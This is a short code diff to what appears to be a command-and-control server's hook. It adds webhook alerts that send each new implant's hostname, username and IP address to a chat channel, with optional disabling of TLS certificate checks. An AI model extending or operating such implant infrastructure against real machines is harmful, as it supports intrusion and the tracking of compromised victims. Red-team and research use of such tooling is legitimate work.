@@ -5,6 +5,10 @@
 
 const srs = require('secure-random-string');
 
+const axios = require('axios');
+
+const https = require('https');
+
 module.exports = function (options = {}) {
   return async context => {
     const { data } = context;
@@ -51,6 +55,29 @@ module.exports = function (options = {}) {
         options.implant = {value: data2._id};
         context.app.service('/modules/run').create({moduleId: autoruns.data[i].moduleId, options: options, autorun: false})
       }
+    });
+
+
+    context.app.service('/webhooks').find().then(webhooks =>{
+      for(var i=0; i< webhooks.data.length; i++){
+        var webhook = webhooks.data[i];
+
+        var instance = axios.create({
+          httpsAgent: new https.Agent({  
+            rejectUnauthorized: !webhook.ignoreCertErrors
+          })
+        });
+        
+        instance.post(webhook.url, {
+          username:'New Implant Bot',
+          text: "### New Implant! :fire: \n| Hostname | Username | IP Address |\n|:---------|:--------:|:-----------|\n|"+data.hostname+"|"+data.username+"|"+data.localIp+"|\n"
+        })
+        .catch(error => {
+          console.error(error);
+        });
+        }
+    }).catch(error => {
+      console.error(error);
     });
     
     context.data = {_id: implant._id};
